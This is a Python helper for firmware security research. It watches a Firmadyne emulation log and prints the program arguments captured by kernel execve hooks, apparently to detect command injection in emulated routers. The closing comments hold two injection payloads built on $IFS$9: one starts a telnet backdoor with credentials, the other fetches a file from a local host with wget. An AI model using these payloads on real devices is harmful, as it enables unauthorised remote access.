#!/usr/bin/python3

import argparse
import sys,os
import signal
from time import sleep

FIRMADYNE_PATH="/home/pwd/SofterWare/firmware-analysis-toolkit/firmadyne"
IMAGE_ID=1
LOG_FILE="qemu.final.serial.log"

ABSFILEPATH="{}/scratch/{}/{}"
LOOPFLAG=True
update_time=0
file_seek=0
history_cmd = []
exit_success = 0
exit_failed = 1

def exit_process(signal_num, stack_frame):
    global LOOPFLAG
    print("Bye ~")
    LOOPFLAG=False

def to_str(strs):
    if isinstance(strs, bytes):
        return strs.decode("utf-8",errors="ignore")
    if isinstance(strs,int):
        return str(strs)
    return strs

def check_file(logfile):
    """waitting until logfile is modified
    
    return Fasle if logfile not found
    """
    global update_time
    if os.path.isfile(logfile) is False:
        print("file",logfile,"not found")
        return False
    while LOOPFLAG:
        tmp_time = os.path.getmtime(logfile)
        if tmp_time > update_time :
            update_time = tmp_time
            break
        sleep(1)
    return True

def show_msg(strs):
    if not strs:
        return
    sys.stdout.write(strs)
    sys.stdout.flush()

def execinfo_parse(fcontent, show_envp=False):
    rslt = ''

    for line in fcontent:
        if not line or '[butterfly] do_' not in line:
            continue
        t_argv = ''
        t_envp = ''
        # print(line.strip("\r\n"))
        # _ = input("Enter:")
        try:
            t_argv, t_envp = line.strip("\r\n").split("argv: ",1)[1].split("; envp: ",1)
        except Exception  as e:
            if "argv: " in line:
                t_argv = line.strip("\r\n").split("argv: ",1)[1]
        binname = t_argv.strip(' ').split(' ')[0]
        whitelist = ['/usr/bin/nc','/bin/ls','/bin/ping']
        if  t_argv not in history_cmd or binname in whitelist:
            history_cmd.append(t_argv)
            cnt = len(history_cmd)
            t_filename = t_argv.strip().split(" ")[0]
            if "/bin/sh" == t_filename or "/bin/bash" == t_filename:
                rslt += "\033[32m" + "[%6d] args: "%cnt + t_argv + "\033[0m\n"
            elif binname in whitelist:
                rslt += "\033[31m" + "[%6d] args: "%cnt + t_argv + "\033[0m\n"
            else:
                rslt += "[%6d] args: "%cnt + t_argv + "\n"
            if show_envp:
                rslt += "[%6d] envp: "%cnt + t_envp + "\n"
    return rslt

def parse_args(argv):
    p = argparse.ArgumentParser(description="made by pwd@butterfly")
    p.add_argument("-f","--firmadyne",dest="firmadyne",default=FIRMADYNE_PATH,type=str,\
        help="path to firmadyne home")
    p.add_argument("-i","--id",dest="id",default=IMAGE_ID,type=int,\
        help="id of image")
    p.add_argument("-l","--log",dest="log",default=LOG_FILE,type=str,\
        help="log of kernel message(printk)")
    p.add_argument("-m","--mode",dest="mode",default=True,\
        help="to do ,only do_execve argv compared support now")
    p.add_argument("--show-envp",action="store_true",default=False,\
        help="show envp infomation, default Fasle")
    return p.parse_args(argv)

def main():
    global file_seek
    p = parse_args(sys.argv[1:])
    logfile = ABSFILEPATH.format(p.firmadyne,p.id,p.log)
    signal.signal(signal.SIGINT,exit_process)
    while LOOPFLAG:
        if check_file(logfile) is False:
            return exit_failed
        
        fp = open(logfile,"rb")
        fp.seek(file_seek,0)
        fcontent = [to_str(i) for i in fp.readlines()]
        if not fcontent:
            continue
        if len(fcontent[-1]) < 2 or fcontent[-1][-2:] != "\r\n":
            fp.close()
            continue
        file_seek = fp.tell()
        fp.close()

        rslt = execinfo_parse(fcontent, show_envp=p.show_envp)
        show_msg(rslt)
        
    return exit_success

if __name__ == "__main__":
    sys.exit(main())


# check file -> open file -> seek -> read file -> record seek ->  analyze -> show 
# &|telnetd$IFS$9-l$IFS$9/usr/sbin/login$IFS$9-u$IFS$9Alphanetworks:123456$IFS$9-i$IFS$9br0$IFS$9&
# |wget$IFS$9http://192.168.0.2$IFS$9-O$IFS$9/tmp/pwd_hack
